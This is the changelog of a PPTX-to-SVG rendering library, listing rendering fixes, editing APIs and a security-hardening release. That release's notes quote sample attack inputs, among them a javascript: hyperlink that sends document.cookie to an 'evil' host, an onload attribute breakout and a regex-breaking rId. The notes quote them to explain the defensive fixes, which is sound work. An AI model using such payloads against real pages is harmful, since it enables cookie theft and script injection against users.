# Changelog

## 0.5.7

### Supply chain

- **Remove `Function('m', 'return import(m)')` fallback in `PptxRenderer.init()`** — the `else` branch in `lib/pptx-renderer.ts` used `new Function(...)` to dynamically import `node:fs` for Node.js < 18 environments without global `fetch`, in a way that bundlers (webpack/vite/esbuild) wouldn't statically resolve. Socket flagged this as a "Uses eval" supply-chain risk because `new Function(...)` is dynamic code execution. Since `package.json` `engines` already requires Node ≥ 22 (which has global `fetch`), the fallback was dead code anyway. `init()` now uses a single `fetch()` path for both browser and Node, dropping the dynamic-import branch entirely. The Socket "Uses eval" warning will clear on next publish. The "Network access" warning remains intentional: `fetch()` is how the library auto-loads the bundled Wasm in browsers, and removing it would force every consumer to manually load `dist/main.wasm` themselves.

### Build / tests

- **Add explicit `moonbitlang/core/test` imports to `moon.pkg` and `*_test.mbt` files** — newer MoonBit compilers require `using @test { assert_eq }` declarations in test files to resolve `assert_eq`, and a corresponding `import { "moonbitlang/core/test" @test } for "test"` block in each package's `moon.pkg`. Added across `xml`, `ooxml`, `renderer`, `serializer`, and `svg_parser` packages so `npm run test:moon` passes on the current toolchain.

### Examples

- **Bump `pptx-svg` dep in `examples/react` from `^0.5.2` to `^0.5.6`** so the React example pulls in the security and OOXML compliance fixes from 0.5.5 / 0.5.6 instead of staying pinned to a pre-hardening release.

## 0.5.6

### Bug Fixes

This release fixes a cluster of OOXML rendering issues uncovered by real-world Google Slides / Keynote-exported decks. The fixes split into three groups: shape-geometry compliance, color-map identity, and text/bullet sizing.

#### Shape geometry

- **`prstGeom prst="roundRect"` rendered as a full pill on wide-thin shapes** — the corner radius was computed as `width / 20`, which on a long callout bar (e.g. 12 m × 0.5 m EMU) emitted `rx ≈ 600 px` and SVG clipped it to `height/2`, turning the shape into a capsule. Per ECMA-376 the radius is `min(width, height) × adj / 100000`, default `adj = 16667` (≈ 16.667 %). Same shape now renders ≈ 5 px corners, matching PowerPoint.
- **Author-specified `roundRect` `<a:gd name="adj"/>` was silently dropped** — `parse_geom("roundRect", avs)` discarded the `avLst`, so any custom corner radius collapsed to the OOXML default during render and again during round-trip. `ShapeGeom::RoundRect` now carries an `Int` adj; the renderer uses it, the serializer writes it back when non-default, and the SVG round-trip preserves it via `data-ooxml-cxn-adj`.
- **`stripedRightArrow` / `leftRightArrowCallout` rendered as plain rectangles** — both presets fell into a "simplified — render as rectangle" branch in `renderer_geom.mbt`. Replaced with the proper ECMA-376 path definitions (3-subpath striped arrow, 18-segment callout body).
- **`bentConnector3` / `bentConnector4` / `bentConnector5` produced wrong / missing trunks for sub-pixel-wide bounding boxes** — Google Slides emits horizontal trunk connectors as a vertical bbox (`cx = 900` EMU, `cy = 2 m` EMU) plus `rot = 90°` and a deliberately out-of-range `adj1 = -39687500` so the bend extends visibly beyond the bbox after rotation. Two precision losses combined: (1) the bend math ran in pixel space, where `cx_p = 900 / 9525 → 0` collapsed `(x2 − x1) × adj / 100000` to zero, and (2) when cx wasn't sub-pixel, `(x2 − x1) × adj1` overflowed Int32 (`900 × −39687500` exceeds 2³¹). Both `render_connector_path` and `render_bent_path` / `render_curved_path` now operate in EMU and convert to pixels at output, and a new `bend_offset(start, span, adj)` helper does the multiplication in `Int64`. `curvedConnector3-5` got the same treatment for consistency.

#### Color map / theme

- **`<a:schemeClr val="dk1"/>` resolved to `lt1`'s color on slides with an inverted layout `clrMap`** — `apply_color_map` baked the cmap into the theme by *overwriting the physical slot fields* (`new.dk1 = resolve_slot(cmap.tx1, theme)`), so direct references to `dk1`/`lt1`/`dk2`/`lt2` returned the wrong color whenever a layout used `<a:overrideClrMapping bg1="dk1" tx1="lt1" .../>` (a common pattern for "dark section" layouts). On slides with black connectors specified as `dk1`, the connectors rendered in `lt1` (= near-white) and disappeared into the white background. `ThemeData` now carries an effective `clr_map: ColorMap`; `apply_color_map` only attaches it (`{..theme, clr_map: cmap}`); `resolve_scheme_color` consults it for logical names (`bg1/tx1/bg2/tx2`, accents, `hlink/folHlink`) and physical names (`dk1/lt1/...`) bypass it. Direct slot references stay anchored to the original theme regardless of clrMap.

#### Text / bullets

- **Auto-fit text boxes inflated when content was several empty paragraphs of small text** — `<a:spAutoFit/>` shapes with empty paragraphs whose `<a:endParaRPr>` declared a small font (e.g. 8 pt) reserved the default 24 pt (~28 px) line height because `para_max_font_emu` only inspected `para.runs` and ignored `epr_font_size` for empty paragraphs. The estimated content height exceeded the stored `cy`, the shape grew downward, and reference URL footers spilled into the slide-master footer band. Empty paragraphs now fall back to `epr_font_size` for line-height computation.
- **Bullet markers were 1.5× larger than the run text** — when neither `<a:buSzPct>` nor `<a:buSzPts>` was present, the bullet `<tspan>` was emitted with no `font-size` attribute, so it inherited the parent `<text>` element's default 18 pt (24 px) instead of the run's actual size. Per ECMA-376 §21.1.2.4.5, a bullet without an explicit size matches the run's font size. The renderer now writes `font-size = run_fs` in this case.
- **Bullets rendered black on slides whose paragraph had no `<a:buClr>`** — when a paragraph relies on inheritance and no `<a:buClr>` is specified, the bullet should inherit the *first run's* color (per ECMA-376). The renderer was emitting the bullet `<tspan>` with no `fill`, so it inherited the `<text>` element's `fill="black"` default and rendered black on dark-themed slides where the run text was white/light gray. Bullets now read `runs[0].color` when `bullet_color` is absent.
- **`a:hueOff` was applied at 100× the intended angle** — the conversion `val / 600 * 10` produced 1000 for a 1° offset (`val = 60000` in OOXML units) instead of the correct 10 (in tenths-of-a-degree, the internal hue scale). A 1° hue shift was being applied as a 100° shift, drastically changing colors. Fixed to `val / 6000`.
- **Gradient stop positions and radial-gradient centers were truncated to integer percent** — sub-percent precision (e.g. `pos = 12500` → 12.5 %) collapsed to whole percent. SVG accepts decimals, so stops are now emitted as 0–1 fractions (`format_pct_decimal`) and radial gradient centers as decimal percents.

### Tests

- **MoonBit unit tests** for: roundRect default adj on a wide-thin bbox (no `rx="576"` regression), roundRect custom-adj round-trip, `stripedRightArrow` / `leftRightArrowCallout` render as multi-segment paths (not the 4-segment rectangle fallback), bullet color inherits the first run's color when `<a:buClr>` is absent, `apply_color_map` preserves physical slot identity under an inverted clrMap (`dk1` stays `#000000`, `bg1` resolves to `#000000` per the cmap), `bentConnector3` with extreme `adj1` keeps the bend outside the bbox (catches both Int32 wrap and the cx ≈ 0 collapse), empty paragraph uses `endParaRPr` font size for autofit height, bullet font-size matches run when bullet size is unspecified, `apply_color_modifiers` `hueOff` produces the correct angular shift on red.
- Test counts: 178 MoonBit (was 167) + 139 Node compatibility + 15 categorical.

### Documentation

- Update `CLAUDE.md` `ShapeGeom` listing to reflect `RoundRect(Int)` carrying the adj, and `ThemeData` listing to include the new `clr_map` field. Add a "Watch Int32 overflow in geometry math" note under Critical MoonBit constraints, pointing to `bend_offset` as the canonical pattern.
- Update `docs/svg-specification.md`: rename "Connector Adjustments" to "Preset Geometry Adjustments" and clarify that `data-ooxml-cxn-adj` also carries non-default `roundRect` adj for round-trip.
- Correct the Wasm size mention in `README.md` / `README.ja.md` / `CLAUDE.md` (~280 KB, was stale at 230 KB / 35 KB).

### Improvements

- Lift the OOXML default `roundRect` adj to a public constant `@ooxml.round_rect_default_adj = 16667`, replacing four inline `16667` literals across `ooxml.mbt`, `renderer.mbt`, `serializer.mbt`, and `main_edit.mbt`.
- Remove the unused `default_font_size_emu()` wrapper around the `default_font_size_emu_` constant; rename the constant to drop the trailing underscore and inline the three callsites.

## 0.5.5

### Security

This release hardens the renderer against malicious or malformed PPTX input. The library targets browser and Node.js consumers that often render the resulting SVG via `innerHTML`, so any unescaped attribute or unfiltered URL was directly reachable as XSS. Demo pages (`web/index.html`, `web/editing.html`, `examples/vanilla`, `examples/react`) all use that pattern.

- **Strip dangerous URL schemes from hyperlinks and external image references** — `<a:hlinkClick>` targets and `<a:blip>` external image targets flowed straight into `<a href>` / `<image href>`, so a `.rels` Target of `javascript:fetch('//evil/'+document.cookie)` would execute on click. New `sanitize_url()` allowlists `http(s)`, `mailto`, `tel`, `ftp(s)`, `data:image/*`, fragments, and relative paths only; everything else is dropped (the `<a>` wrapper is omitted entirely). Leading whitespace and control bytes are stripped before scheme detection because browsers ignore them when resolving `href`.
- **XML-escape SVG attribute values from PPTX-derived strings** — `a()` / `da()` helpers concatenated values directly into `name="..."`, allowing a font face, placeholder type, or warp preset containing `"` to break out of the attribute and inject `onload="alert(1)"`. Both helpers now route values through `xml_escape`. Numeric helpers (`ai()`/`dai()`) bypass the escape since `int_to_str` cannot produce metacharacters. Math-XML emitters that previously double-escaped have been adjusted accordingly.
- **Decode XML entities in notes / comment APIs** — `getSlideNotes`, `getSlideComments`, and `getCommentAuthors` returned raw inner XML (`&amp;`, `&lt;script&gt;`, `&#65;`). Consumers passing the result to `.innerHTML` would see the entities re-interpreted as live markup. Added `decodeXmlEntities()` so the returned strings are plain text, safe for `.textContent`. Behavior for `.innerHTML` consumers is unchanged in spirit but the documented contract is now plain text.
- **Cap ZIP decompression to defend against archive bombs** — `extractZip` had no upper bound on inflate output, so a 1 KB DEFLATE block could expand into multi-gigabyte allocations and hang the tab. Added a 256 MiB per-entry cap (`MAX_INFLATE_BYTES`) and a 1 GiB per-archive cap (`MAX_ARCHIVE_INFLATE_BYTES`). Entries whose declared `uncompressedSize` exceeds the per-entry cap are skipped before inflating; the streaming inflate also aborts mid-flight if the cap is reached, so a malicious central directory that lies about size is still contained. The deflate writer's pending promise is drained on abort so the cap doesn't surface as `unhandledRejection`.
- **Bound EMF / WMF point counts and DIB sizes** — `lib/emf-converter.ts` `readPoints` read the point count as a raw `Uint32` with no upper bound, allowing a malicious EMF with `count = 0xFFFFFFF0` to spin a 4 billion-iteration loop. Counts are now clamped by both record-size capacity and a 100,000-point hard cap. WMF `META_POLYGON` / `META_POLYLINE` / `META_POLYPOLYGON` apply the same record-size capacity check and skip the record on malformed totals. EMF `STRETCHDIBITS` validates `offBmi` / `cbBmi` / `offBits` / `cbBits` against the record bounds, with overflow guards, before allocating the BMP buffer.
- **Cap XML parser recursion depth** — `Parser::parse_children` used unbounded recursion, so an OOXML file with thousands of nested elements could overflow the Wasm call stack. A `max_xml_depth = 1024` is enforced by passing a `depth` counter; once the cap is reached, the lexical `skip_to_close()` walks the rest of the element non-recursively. Parsing remains linear-time on adversarial input.
- **Eliminate O(N²) string concatenation in the XML parser hot paths** — `read_until_char`, `decode_entities`, `xml_escape`, etc. built results one character at a time via `result = result + char`, which is quadratic on MoonBit's immutable strings. Even on benign-but-large slide.xml the parser could lock the UI. Added `concat_balanced(parts)` (bottom-up pairwise merge → O(N log N), still using only `concat` so Tier-2/3 browser polyfill compatibility is preserved) and routed nine hot functions through it: `collect_chars`, `read_until_char`, `read_until_str`, `parse_name`, `decode_entities`, `xml_escape`, `str_substring`, `str_suffix`, `str_replace_all`.
- **Escape regex metacharacters before embedding PPTX-derived rIds / Targets in `new RegExp`** — `pptx-renderer.ts` interpolated rIds, target paths, and type suffixes directly into dynamic patterns at 13 call sites. A `.rels` rId of `rId$(.*)+` would throw `SyntaxError` from the regex compiler, and the resulting `ERROR:` string had a path back to the SVG attribute injection (now closed above, but worth fixing at the source). Added a module-level `escapeRegex(s)` helper and applied it to every dynamic `RegExp` in `extractRelTarget`, `updatePresentationXmlForAdd`, `updatePresentationXmlForDelete`, `updatePresentationXmlForReorder`, `resolveRidTarget`, and `resolveRelTarget`.

### Tests

- **MoonBit unit / E2E tests** for `sanitize_url` (allowlist coverage, case insensitivity, leading-whitespace stripping, `data:image/*`-only, javascript / vbscript / file rejection), end-to-end attribute escaping (`da("ph-type", ...)` with malicious `"`), end-to-end hyperlink dropping (`javascript:` target → no `<a href>` wrapper in output), `concat_balanced` correctness on empty / 1 / even / odd / 10 000-element inputs, and XML deep-nesting (5000 nested elements parses without stack overflow).
- **Node integration tests** (`test_fixtures/tests/security.test.mjs`) for the per-entry / streaming decompression caps (synthetic ZIP with 500 MiB declared and a real 260 MiB-of-zeros bomb), entity-decoded notes (`getSlideNotes` returns `& <script> A` from a slide containing `&amp; &lt;script&gt; &#65;`), and end-to-end render / export of a PPTX whose slide rels contain a regex-metachar rId (`rId$(.*)+`) — neither path throws.
- Test counts: 167 MoonBit (was 151) + 139 Node compatibility + 15 categorical (was 12).

### Improvements

- Drop unused `newCount` parameter from the private `updatePresentationXmlForAdd` (silences `noUnusedParameters` and matches the actual data flow).

## 0.5.4

### Bug Fixes

- **Fix shapes using `p:style`/`a:fillRef` rendering as empty** — shapes with no explicit fill or line in `p:spPr` that relied on `<p:style><a:fillRef idx="N">` (and `<a:lnRef>`) pointing at the theme's `a:fmtScheme/a:fillStyleLst` rendered with no fill at all. `ThemeData` now captures `fill_style_xmls` and `ln_style_xmls` at parse time (raw XML, `phClr` placeholder preserved); `parse_sp` falls back to `resolve_fill_ref` / `resolve_ln_ref`, which substitute `phClr` with the referenced scheme color and re-parse through the existing `parse_gradient_fill` / `parse_solid_fill` / `parse_stroke` helpers. Explicit `spPr` fill/line still wins.
- **Fix numbered-list layouts losing their bullets** — when a layout placeholder declared `<a:lstStyle><a:lvl1pPr><a:buAutoNum type="arabicPeriod"/>`, slide paragraphs inheriting from that placeholder rendered with the default `•` bullet because `parse_level_defaults` only extracted `a:buChar` and `LevelTextDefaults` had no `bullet_auto` field. `bullet_auto` is now parsed into `LevelTextDefaults` and `apply_para_spacing_from_style` inherits it (with `bullet_none` > `bullet_auto` > `bullet` precedence). Agenda-style numbered lists now render as `1. 2. 3. …`.

## 0.5.3

### Bug Fixes

- **Fix SVG-only blip fills rendering as placeholders** — `<a:blip>` elements that only carry an `<asvg:svgBlip>` reference in `a:extLst` (no `r:embed`) were treated as empty and dropped during parsing. `BlipFill::is_none()` and `parse_blip_fill_node()` now also check `svg_rid`, and the serializer omits the `r:embed` attribute when only the SVG reference is present. Fixes cover-slide logos that use the SVG-only variant.
- **Fix bullet overlapping text on positive first-line indent** — the renderer always repositioned text to `marL` after the bullet, which is correct for hanging indent (`indent < 0`) but caused the bullet to overlap the first characters when a paragraph used a positive first-line indent. Repositioning is now restricted to hanging indent; with positive indent the text flows naturally after the bullet.
- **Fix free-textbox runs losing color from `endParaRPr`** — runs in free textboxes (no placeholder chain) that inherited their color from the paragraph's `endParaRPr` were rendering black when the earlier cross-paragraph carry-over logic was removed. `TextParagraph` now stores `epr_font_size` / `epr_color` / `epr_font_face` / `epr_ea_font`, and `main_inherit.mbt::apply_epr_fallbacks()` applies them as a last-resort fallback *after* layout/master inheritance has run. The fallback is also shared across sibling paragraphs within the same shape so that a paragraph without its own `endParaRPr` still picks up values from its siblings (matches PowerPoint's "remembered run state" behavior).
- **Fix shape-level rotation not applied to text** — text inside a shape with `<a:xfrm rot="...">` was rendered upright because `renderer_text.mbt` only applied `bodyPr/@rot` (text-only rotation) and ignored the shape transform rotation. For shapes with no visible fill or stroke (e.g. rotated text boxes), the shape's rotated `<rect>` was invisible so nothing showed the rotation. `make_text_header` now composes `t.rot + body_props.rot` into the text's rotate transform, both pivoting on the shape center.

## 0.5.2

### Bug Fixes

- **Fix text run extraction from wrapped/bulleted text** — continuation `<tspan>` elements generated by text wrapping, bullet repositioning, justify word-spacing, and multi-column overflow were missing `data-ooxml-para-idx` attributes, causing `update_slide_from_svg` round-trip to lose those text runs. Added the attribute to all 5 continuation tspan code paths in `renderer_text.mbt`.

## 0.5.1

### Features

- **Text editing API** — full paragraph and text run CRUD operations:
  - `addParagraph()` / `deleteParagraph()` — add/remove paragraphs with alignment control
  - `addRun()` / `deleteRun()` — add/remove text runs within paragraphs
  - `updateTextRunStyle()` — set bold/italic (tri-state: on/off/no-change)
  - `updateTextRunFontSize()` — set font size in hundredths of a point
  - `updateTextRunColor()` — set text color (RGB) or clear to inherit
  - `updateTextRunFont()` — set Latin, East Asian, and Complex Script font families
  - `updateParagraphAlign()` — set paragraph alignment (left/center/right/justify/inherit)
  - `updateTextRunDecoration()` — set underline, strikethrough, superscript/subscript
- **Slide management API** — programmatic slide operations:
  - `addSlide()` — add a blank slide at any position, with optional layout copy from an existing slide
  - `deleteSlide()` — remove a slide (minimum 1 must remain)
  - `reorderSlides()` — reorder slides by permutation array
  - Automatically updates `presentation.xml`, `.rels`, and `[Content_Types].xml`
- **Image operations API** — add, replace, and delete picture shapes:
  - `addImage()` — add a picture shape with image data (PNG, JPEG, GIF, BMP, TIFF, SVG). Handles media file storage, `.rels` updates, and `[Content_Types].xml` management automatically
  - `replaceImage()` — swap the image of an existing picture shape (same or different format)
  - `deleteImage()` — remove a picture shape and clean up orphaned media files
- **Shape management enhancements**:
  - `addShapeText()` — add text paragraphs to existing shapes
  - `duplicateShape()` — duplicate a shape with configurable offset
  - `updateShapeGradientFill()` — set gradient fill with angle and color stops
  - `updateShapeStroke()` — set stroke color, width, and dash pattern (or remove stroke)

### Improvements

- **Code refactoring**: split `main.mbt` (2229 lines) into `main.mbt` (1161, read-only APIs) + `main_edit.mbt` (810, editing APIs) with shared `with_shape()`/`with_run()` validation helpers
- **ZIP binary support**: `buildZip()` now accepts `binaryModifications` parameter for adding/replacing binary entries (images)
- **Deduplicated helpers** in `pptx-renderer.ts`: consolidated `findNextRId()`/`nextRid()`, extracted `resolveRidTarget()` for relationship ID resolution

### Tests

- 35 Node.js editing API tests (`test_node_compat.mjs`): shape CRUD, text editing, image operations, round-trip export verification

### Bug Fixes

- Fix garbled characters in README.ja.md

### Documentation

- Add slide management, text editing, and image API tables to README.md / README.ja.md
- Add slide management and image operations sections with usage examples to `docs/editing-guide.md`
- Update CLAUDE.md with editing exports list and `test_node_compat.mjs` in key files
- Interactive editing demo (`web/editing.html`) updated with slide management controls, text formatting panel, and image upload UI

## 0.5.0

### Features

- **Node.js 22+ support** — `PptxRenderer` now works on Node.js (server-side) in addition to browsers. WasmGC + js-string builtins are natively supported on Node.js 22+
- `init()` now accepts `Uint8Array` / Node.js `Buffer` directly (in addition to `ArrayBuffer` and URL string)
- 4-tier Wasm instantiation fallback in `wasm-compat.ts` (added tier-1b for Node.js)

### Breaking Changes

- Minimum Node.js version raised from 18 to 22 (required for WebAssembly GC support)

## 0.4.5

### Features

- **Office 2016+ charts (cx:chart)** — full parsing and SVG rendering for 6 ChartEx types: waterfall, treemap, sunburst, histogram, box & whisker, funnel. Includes `mc:AlternateContent` detection, cx:chartSpace XML parser with hierarchical data support
- **Justified text** — `algn="just"` word-spacing distribution for paragraph justification
- **Fill overlay effect** — `a:fillOverlay` with 5 blend modes (over, mult, screen, darken, lighten)
- **Preset shadow effect** — `a:prstShdw` rendering with all OOXML preset shadow types
- **Blur effect** — `a:blur` Gaussian blur via SVG filter

### Tests

- MoonBit unit tests expanded from 84 to 139 (cx:chart parser, renderer, effects, text)
- CI integration for MoonBit test runner

### Documentation

- Update README / README.ja.md with cx:chart types and new effect support
- Update CLAUDE.md data model with ChartKind variants and cx:chart architecture

## 0.4.4

### Features

- **OMML math rendering** — full SVG rendering of math equations: fractions (`m:f`), radicals (`m:rad`), superscript/subscript (`m:sSup`/`m:sSub`/`m:sSubSup`), large operators (`m:nary` — ∫/Σ/Π), delimiters (`m:d`), accents (`m:acc`), matrices (`m:m`), over/under bars (`m:bar`). Replaces previous plain-text fallback
- **Text warp visual rendering** — SVG `<textPath>` and transform-based rendering for `prstTxWarp` presets (arch, wave, chevron, etc.). Previously data-only preservation
- **WMF → SVG converter** — built-in converter for WMF (Windows Metafile) images, matching the existing EMF converter approach

### Documentation

- Update README / README.ja.md to reflect math rendering and WMF conversion capabilities
- Update `docs/svg-specification.md` with math rendering details

## 0.4.3

### Features

- **Slide transitions & timing**: preserve `<p:transition>` and `<p:timing>` XML in round-trip export
- **Hidden slide detection**: `isSlideHidden()` API and `data-ooxml-hidden` SVG attribute for `<p:sld show="0">`

### Bug Fixes

- Fix table rows with `h="0"` rendering as crushed/compressed — auto-compute row height from cell text content (font size, wrapping, margins)
- Fix text overlapping in fixed-size text boxes — auto-shrink now applies to all overflowing text, not just explicit `<a:normAutofit>`
- Fix XML numeric character references (`&#x2022;`, `&#8226;`, etc.) rendering as literal text instead of decoded characters

## 0.4.2

### Bug Fixes

- Fix text not rendering in shapes with `cy="0"` (auto-size text boxes common in generated PPTXs)
- Fix spurious black borders on shapes with empty `<a:ln></a:ln>` elements (now treated as no stroke)
- Fix horizontal lines becoming diagonal after cy=0 auto-size (lines/connectors excluded from auto-size logic)

## 0.4.1

### Features

- **SmartArt** fallback rendering: parse `mc:AlternateContent` → render `mc:Fallback` shapes, preserve `mc:Choice` (DiagramML) for round-trip
- **OLE / Embedded objects**: render fallback image from `p:oleObj/p:pic`, preserve original XML for round-trip
- **Media** (video/audio): render poster frame image, preserve `a:videoFile`/`a:audioFile` XML for round-trip
- **Math equations** (OMML `m:oMath`): plain text fallback display from `m:t` elements, preserve original XML for round-trip
- **Speaker notes** API: `getSlideNotes()` returns paragraph text, preserved in round-trip export
- **Comments** API: `getSlideComments()` / `getCommentAuthors()` for reading comments, preserved in round-trip export
- Log level control via `logLevel` option (`'silent'` | `'error'` | `'warn'` | `'info'` | `'debug'`)

### Bug Fixes

- Fix ZIP extraction for PPTX files with data descriptor flag (bit 3) — use Central Directory for reliable entry sizes instead of local headers, fixing read errors with Google Slides exports
- Fix emoji rendering in text runs

### Improvements

- WMF / TIFF / embedded font binaries preserved in round-trip export (no rendering, system font fallback)

### Documentation

- Add SmartArt, OLE, Media, Math attributes to `docs/svg-specification.md`
- Update README feature lists and supported features sections
- Consolidate Python test generator imports

## 0.4.0

### Features

- Shape-level editing API: `renderShapeSvg()`, `updateShapeTransform()`, `updateShapeText()`, `updateShapeFill()` — modify cached SlideData in-place without full slide re-parse
- Group shape child support for editing API (composite shape index resolution)
- Unit conversion helpers: `pxToEmu()`, `emuToPx()`, `ptToHundredths()`, `hundredthsToPt()`, `degreesToOoxml()`, `ooxmlToDegrees()`
- SVG DOM helpers: `findShapeElement()`, `getShapeTransform()`, `getAllShapes()`, `getSlideScale()`
- Interactive editing demo page (`web/editing.html`) with drag move, resize handles, text editing panel, and fill color picker
- Cache-aware `renderSlideSvg()` — modified slides skip XML re-parse, preserving edits

### Improvements

- Extract shared CSS to `web/styles.css` and common JS utilities to `web/common.js`, reducing ~200 lines of duplication across demo pages

### Documentation

- Add shape-level editing API and helpers to README.md / README.ja.md
- Add `docs/editing-guide.md` with recommended preview+commit pattern for interactive editing

## 0.3.4

### Features

- Stacked / percentStacked bar chart support (horizontal & vertical)

### Bug Fixes

- Fix text overflowing to the right due to fallback fonts affecting Canvas 2D text measurement
- Fix CJK text wrap accuracy with cumulative string measurement (reduces side-bearing over-count)
- Add normAutofit dynamic scaling (`<a:normAutofit>`) — auto-shrink font size and line spacing to fit text in shape
- Fix vertical centering — exclude trailing line space from text height calculation
- Fix percentage-based line spacing base factor (1.4 → 1.2, matching OOXML single spacing spec)

### Documentation

- Add `renderer_table.mbt` to key files in CLAUDE.md
- Document `data-ooxml-font-face` and `reff-*` text run effect attributes in svg-specification.md

## 0.3.3

### Bug Fixes

- Fix bullet property inheritance from master/layout lstStyle
- Fix marL sentinel (-1 = unset) to distinguish explicit `marL="0"` from unset
- Limit endParaRPr carry-over to color/font only
- Fix endParaRPr color inheritance across paragraphs
- Fix vertical line rendering
- Fix arrow geometry, kinsoku line-break, text outline stroke
- Fix table split rendering

## 0.3.2

### Bug Fixes

- Fix tint color modifier formula (ECMA-376 compliance)
- Fix table cell default font size (18pt → 10pt for built-in table styles)
- Fix per-master theme resolution for multi-theme presentations
- Fix text measurement unit mismatch (pt → px) for accurate text wrapping
- Fix table cell vertical anchor clamping (prevent negative y-offset)
- Fix percentage line spacing in table cells

## 0.3.1

### Bug Fixes

- Fix table cell text overflow and text measurement accuracy
- Fix table cell text wrapping and auto-row-height for h=0 rows
- Fix table rendering — hMerge support, text alignment, bullets, auto-contrast

## 0.3.0

### Bug Fixes

- Fix auto-numbering for numbered lists
- Fix text indent and paragraph margin handling
- Fix homePlate arrow preset geometry
- Fix picture border rendering
- Fix text vertical centering and paragraph style inheritance

## 0.2.0

### Features

- EMF to SVG converter (vector paths, text, bitmaps)
- Font fallback mappings (customizable via `PptxRendererOptions`)
- Bubble chart, stock chart, surface chart, ofPie chart support
- Chart 3D view (rotX, rotY, perspective)
- Chart data labels and trendlines
- Shape 3D effects (bevel, extrusion, material, contour)
- Scene 3D (camera preset, light rig)
- Text warp presets
- Text outline and gradient fill on text

## 0.1.0

Initial release.

### Features

- PPTX to SVG conversion with `data-ooxml-*` attribute preservation
- SVG to PPTX round-trip export
- `PptxRenderer` class with auto-resolving Wasm initialization
- Full shape support: AutoShape (~154 presets), custom geometry, connectors, group shapes
- Complete text rendering: paragraphs, runs, bullets, fonts, formatting, hyperlinks
- Fill types: solid, gradient (linear/radial), pattern (48 presets), image (stretch/tile/crop)
- Stroke: 11 dash patterns, 5 arrow types, compound lines, gradient/pattern stroke
- Effects: outer/inner shadow, glow, soft edge, reflection (SVG filters)
- Tables: cell merge, borders, styles, conditional formatting
- Charts: bar, line, pie, doughnut, scatter, area, radar
- Theme resolution: 12 colors, font scheme, all color modifiers
- Master/Layout placeholder inheritance
- 3-tier Wasm js-string builtins compatibility (Chrome 111+)
- Zero external dependencies
